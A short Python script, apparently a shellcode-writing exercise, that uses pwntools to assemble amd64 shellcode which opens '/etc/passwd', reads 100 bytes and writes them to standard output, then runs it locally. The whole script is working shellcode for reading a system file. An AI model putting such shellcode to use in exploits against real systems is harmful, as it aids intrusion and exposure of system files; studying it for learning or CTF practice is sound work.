#like input ls

from pwn import *

#set environment

context.arch = 'amd64'

code = b''
code += asm(shellcraft.pushstr("/etc/passwd\x00"))
code += asm(shellcraft.open("rsp","O_RDONLY",0))
code += asm(shellcraft.read(3,"rsp",100))
code += asm(shellcraft.write(1,"rsp",100))


print(code)
print(disasm(code))

run_shellcode(code).interactive()
